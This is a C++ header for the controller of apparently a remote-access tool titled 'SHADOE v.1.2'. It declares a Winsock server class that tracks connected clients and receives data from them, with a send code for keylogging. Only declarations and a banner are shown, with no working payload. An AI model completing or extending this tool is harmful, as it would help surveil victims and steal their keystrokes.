#pragma once
//-- The C standard Library
#include <cstdlib>

#include <WS2tcpip.h>
#pragma comment(lib, "ws2_32.lib") //--Pragma comment for linker.

#include <windows.h>

//-- Other headers.
#include "sEncryption.h"

//--Standard includes.
#include <iostream>
#include <vector>
#include <string>
#include <sstream>
#include <thread>
#include <fstream>

#define MAX_BUF (1024*64)

enum sendcode
{
	none, text, file, keylog
};


typedef struct connectedClient
{
	std::string name;
	std::string ipAddress;
	unsigned int id;
	char isActive = 0;

	connectedClient(char*, char*, unsigned int);

	void __cdecl setIsActive(char);
};

void __cdecl outputColor(int);
void __cdecl sendInfoToClient(unsigned int, char*, int);


class Controller
{
public:
	std::string ipv4ADDR;
	unsigned int activeClient;
	unsigned int socketPort;
	std::vector<connectedClient> allConnectedClients;
	std::vector<std::thread> threads;

	static void __cdecl listenForClients(int, unsigned int*, std::string*, std::vector<connectedClient>*, std::vector<std::thread>*);

	const char* __cdecl _startText()
	{
		return startText;
	};
private:
	static void __cdecl recvThings(connectedClient, std::vector<connectedClient>*);

	const char* startText =
		"     SSSSSSSS     SSS       SSS         SSS        SSSSSSS         SSSSSSSS      SSSSSSSSSS\n"
		"   SSSSSS         SSS       SSS        SSSSS       SSS  SSS      SSSS    SSSS    SSSSSSS\n" 
		"  SSS             SSS       SSS       SSS SSS      SSS    SSS    SSS      SSS    SSS\n"
		"   SSSSS          SSSSSSSSSSSSS      SSS   SSS     SSS     SSS   SSS      SSS    SSSS\n"
		"     SSSSS        SSSSSSSSSSSSS     SSSSSSSSSSS    SSS      SSS  SSS      SSS    SSSSSSSS\n"
		"       SSSSS      SSS       SSS    SSS       SSS   SSS     SSS   SSS      SSS    SSS\n" 
		"         SSSSS    SSS       SSS    SSS       SSS   SSS   SSSS    SSS      SSS    SSS\n"
		"   SSSSSSSSSS     SSS       SSS   SSS         SSS  SSSSSSSS      SSSS    SSSS    SSSSSS\n"
		"     SSSSSS       SSS       SSS   SSS         SSS  SSSSS           SSSSSSSS      SSSSSSSSSSS v.1.2\n\n"
		"Type 'help' for quick docs.";
};
